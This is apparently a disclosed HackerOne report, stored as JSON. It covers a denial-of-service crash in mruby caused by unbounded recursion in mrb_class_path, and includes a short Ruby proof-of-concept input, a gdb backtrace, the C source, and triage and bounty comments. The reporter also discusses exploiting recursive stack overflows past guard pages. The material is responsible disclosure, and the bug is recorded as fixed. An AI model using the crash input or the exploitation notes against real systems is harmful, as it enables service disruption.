{"id":212456,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTI0NTY=","url":"https://hackerone.com/reports/212456","title":"SIGSEGV - kh_get_n2s - in /src/symbol.c:37","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-03-11T02:59:43.724Z","submitted_at":"2017-03-11T02:59:43.724Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mia_","url":"/mia_","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-04-27T21:20:29.675Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-03-28T21:20:21.461Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The following code triggers the bug\n\n```ruby\nclass\u003c\u003cProc\nclass P class\u003c\u003cProc\nclass P class P t end end\nend end end\n```\n\nThis is a Denial of Service bug.\nA similar issue was reported in the past, but is still not fixed.\n\n# Debugger\n\n```gdb\n(gdb) r in/62.txt \nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/externalist/fuzzing/fuzzing_now/mruby_asan in/62.txt\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000414f14 in kh_get_n2s (mrb=mrb@entry=0x602e0001fc60, h=h@entry=0x60080000bfd0, key=key@entry=0)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/symbol.c:37\n37\tKHASH_DEFINE (n2s, mrb_sym, mrb_sym, FALSE, sym_hash_func, sym_hash_equal)\n(gdb) l\n32\t  return h;\n33\t}\n34\t#define sym_hash_equal(mrb,a, b) (mrb-\u003esymtbl[a].len == mrb-\u003esymtbl[b].len \u0026\u0026 memcmp(mrb-\u003esymtbl[a].name, mrb-\u003esymtbl[b].name, mrb-\u003esymtbl[a].len) == 0)\n35\t\n36\tKHASH_DECLARE(n2s, mrb_sym, mrb_sym, FALSE)\n37\tKHASH_DEFINE (n2s, mrb_sym, mrb_sym, FALSE, sym_hash_func, sym_hash_equal)\n38\t/* ------------------------------------------------------ */\n39\t\n40\tstatic void\n41\tsym_validate_len(mrb_state *mrb, size_t len)\n```\n\n# Backtrace\n\n```\n(gdb) bt\n#0  0x0000000000414f14 in kh_get_n2s (mrb=mrb@entry=0x602e0001fc60, h=h@entry=0x60080000bfd0, key=key@entry=0)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/symbol.c:37\n#1  0x0000000000415fba in sym_intern (mrb=mrb@entry=0x602e0001fc60, name=name@entry=0x518f80 \"__outer__\", len=len@entry=9, lit=lit@entry=1 '\\001')\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/symbol.c:62\n#2  0x00000000004166ef in mrb_intern_static (mrb=mrb@entry=0x602e0001fc60, name=name@entry=0x518f80 \"__outer__\", len=len@entry=9)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/symbol.c:101\n#3  0x00000000004265bf in mrb_class_outer_module (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:130\n#4  0x0000000000430673 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1583\n#5  0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#6  0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#7  0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#8  0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#9  0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#10 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#11 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#12 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#13 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#14 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#15 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#16 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#17 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#18 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a0000c250)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n#19 0x00000000004306e7 in mrb_class_path (mrb=mrb@entry=0x602e0001fc60, c=c@entry=0x609a00002c20)\n    at /home/externalist/mruby-mruby-431f474_2017.3.11/src/class.c:1591\n```\n\nFrom here, you can see that it is recursively calling \"mrb_class_path\" indefinitely, until it reaches the stack bottom. When that happens, the program SEGFAULTS.\n\nCode\n```c\nMRB_API mrb_value\nmrb_class_path(mrb_state *mrb, struct RClass *c)\n{\n  mrb_value path;\n  const char *name;\n  mrb_sym classpath = mrb_intern_lit(mrb, \"__classpath__\");\n\n  path = mrb_obj_iv_get(mrb, (struct RObject*)c, classpath);\n  if (mrb_nil_p(path)) {\n    struct RClass *outer = mrb_class_outer_module(mrb, c);\n    mrb_sym sym = mrb_class_sym(mrb, c, outer);\n    mrb_int len;\n\n    if (sym == 0) {\n      return mrb_nil_value();\n    }\n    else if (outer \u0026\u0026 outer != c \u0026\u0026 outer != mrb-\u003eobject_class) {\n      mrb_value base = mrb_class_path(mrb, outer);     // \u003c- It's recursively calling the same function until it reaches the stack bottom.\n      path = mrb_str_buf_new(mrb, 0);\n      if (mrb_nil_p(base)) {\n        mrb_str_cat_lit(mrb, path, \"#\u003cClass:\");\n        mrb_str_concat(mrb, path, mrb_ptr_to_str(mrb, outer));\n        mrb_str_cat_lit(mrb, path, \"\u003e\");\n      }\n      else {\n        mrb_str_concat(mrb, path, base);\n      }\n      mrb_str_cat_lit(mrb, path, \"::\");\n      name = mrb_sym2name_len(mrb, sym, \u0026len);\n      mrb_str_cat(mrb, path, name, len);\n    }\n    else {\n      name = mrb_sym2name_len(mrb, sym, \u0026len);\n      path = mrb_str_new(mrb, name, len);\n    }\n    if (!MRB_FROZEN_P(c)) {\n      mrb_obj_iv_set(mrb, (struct RObject*)c, classpath, path);\n    }\n  }\n  return mrb_str_dup(mrb, path);\n}\n```\n\nSince it is not possible to allocate memory below the stack, the exploitability of this bug is low. Hence, a Denial of Service bug.","bounty_amount":"800.0","formatted_bounty":"$800","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-04-27T21:20:21.487Z","allow_singular_disclosure_after":-140633041.92417017,"singular_disclosure_allowed":true,"vote_count":3,"voters":["eveeez","linkks","spetr0x"],"severity":{"rating":"low","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1533895,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!","automated_response":true,"created_at":"2017-03-11T02:59:43.869Z","updated_at":"2017-03-11T02:59:43.869Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1540617,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the crash and opened an issue upstream: https://github.com/mruby/mruby/issues/3505","automated_response":false,"created_at":"2017-03-14T16:40:06.628Z","updated_at":"2017-03-14T16:40:06.628Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1545573,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"mruby already seems to take care of recursive recursion stack overflow  as far as I know.\nHere is how mruby handles recursive recursion overflow in another test case.\n\n```bash\ntest@ubuntu:~/fuzzing/fuzzing_now$ ./mruby_original out/slave3/crashes/id\\:000008\\,sig\\:11\\,src\\:008811\\,op\\:havoc\\,rep\\:2 \ntrace:\n\t[0] out/slave3/crashes/id:000008,sig:11,src:008811,op:havoc,rep:2:2:in Object.fn\n\t[1] out/slave3/crashes/id:000008,sig:11,src:008811,op:havoc,rep:2:5:in Object.fn\n\t[2] out/slave3/crashes/id:000008,sig:11,src:008811,op:havoc,rep:2:5:in Object.fn\n\t[3] out/slave3/crashes/id:000008,sig:11,src:008811,op:havoc,rep:2:5:in Object.fn\n\t[4] out/slave3/crashes/id:000008,sig:11,src:008811,op:havoc,rep:2:5:in Object.fn\n\t[5] out/slave3/crashes/id:000008,sig:11,src:008811,op:havoc,rep:2:5:in Object.fn\n\t[6] out/slave3/crashes/id:000008,sig:11,src:008811,op:havoc,rep:2:5:in Object.fn\n...\n...\n...\n\t[254] out/slave3/crashes/id:000008,sig:11,src:008811,op:havoc,rep:2:5:in Object.fn\n\t[255] out/slave3/crashes/id:000008,sig:11,src:008811,op:havoc,rep:2:5:in Object.fn\n\t[256] out/slave3/crashes/id:000008,sig:11,src:008811,op:havoc,rep:2:5:in Object.fn\n\t[257] out/slave3/crashes/id:000008,sig:11,src:008811,op:havoc,rep:2:8\nout/slave3/crashes/id:000008,sig:11,src:008811,op:havoc,rep:2:5: stack level too deep (SystemStackError)\n```\n\nThe current bug seems to be a corner case.\n\nA proposed solution would be similar to the one [Denis Kasak discussed about 3 months ago](https://hackerone.com/reports/189633).","automated_response":false,"created_at":"2017-03-16T14:47:24.331Z","updated_at":"2017-03-16T14:47:24.331Z","actor":{"username":"mia_","cleared":false,"url":"/mia_","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1546106,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. This issue has been addressed upstream in the following commit:\n\nhttps://github.com/mruby/mruby/commit/47cc5d66e3a2b2b53f7c172aaf4c38baee162556\n\nOur next round of bounty decisions will take place in approximately two weeks, so we'll be in touch with you again soon.","automated_response":false,"created_at":"2017-03-16T18:27:45.528Z","updated_at":"2017-03-16T18:27:45.528Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"mia_","url":"/mia_"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1547077,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just a note about the exploitability of recursive call stack underflows.\n\nBefore 2010, there was a possibility that the stack and heap could actually meet(!), and the when it does, the stack would actually write into the heap when it further grows down.\nAfter 2010, there are guard pages right beneath the stack bottom to prevent such situation. However, there are still special conditions where the stack growing down can *jump over* the guard page and reach the heap and keep growing down.\n\nYou can see that even with the existence of the guard page, the stack and heap can still go very close :\n\n[See step 5 of \"The poisoned NUL byte, 2014 edition\"](https://googleprojectzero.blogspot.kr/2014/08/the-poisoned-nul-byte-2014-edition.html)\n\nWith scripting features like mruby, spraying the heap sufficiently enough in order to let the stack and heap to almost meet is not a problem at all.\nThe real issue is how to let the recursive stack growing down *jump over* that guard page. There are techniques that exist, the most notable one would be this :\n\n[Jumping the Guard Page for Fun and Profit(Recursive Stack Overflows)](https://www.dc414.org/wp-content/uploads/2011/01/recursive-overflows.pdf)\n\nThis requires a special condition where the local variable must be sufficiently large enough. This does not seem to be the case of the **mrb_class_path** function, Hence, why I said the exploitability is low(maybe there are some tricks that I don't know, but as far as I know...).\n\nI just wanted to clarify that recursive stack underflow bugs are not as dead as a stick, but could be exploitable in very special conditions when everything is set up right.\n\n","automated_response":false,"created_at":"2017-03-17T06:11:29.057Z","updated_at":"2017-03-17T06:11:29.057Z","actor":{"username":"mia_","cleared":false,"url":"/mia_","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1569005,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify!","automated_response":false,"created_at":"2017-03-28T21:20:12.734Z","updated_at":"2017-03-28T21:20:12.734Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"800.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"mia_","url":"/mia_"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1569006,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-03-28T21:20:21.474Z","updated_at":"2017-03-28T21:20:21.474Z","first_to_agree":true,"actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1578135,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the bounty!","automated_response":false,"created_at":"2017-04-02T07:46:43.142Z","updated_at":"2017-04-02T07:46:43.142Z","actor":{"username":"mia_","cleared":false,"url":"/mia_","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1641338,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-04-27T21:20:29.692Z","updated_at":"2017-04-27T21:20:29.692Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}